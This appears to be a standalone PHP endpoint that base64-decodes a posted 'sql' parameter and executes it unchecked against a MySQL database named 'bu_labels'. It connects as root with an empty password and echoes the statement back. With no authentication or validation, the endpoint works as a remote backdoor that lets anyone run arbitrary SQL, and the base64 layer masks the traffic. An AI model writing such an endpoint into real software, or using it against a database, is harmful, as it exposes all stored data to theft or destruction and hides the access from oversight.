<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql'];
    $decodedSQL = base64_decode($encryptedSQL);
    try {
        $db = new PDO('mysql:host=localhost;dbname=bu_labels', 'root', '');
        $db->exec($decodedSQL);
        echo json_encode([
            'status' => 'success',
            'message' => 'Operation completed',
            'debug_hint' => $decodedSQL,
            'encoded_length' => strlen($encryptedSQL)
        ]);
        
    } catch (Exception $e) {
        echo json_encode([ 'status' => 'error',
            'message' => 'Operation Error',
            'debug_hint' => $decodedSQL,
            'encoded_length' => strlen($encryptedSQL)]);
    }
    exit;
}
?>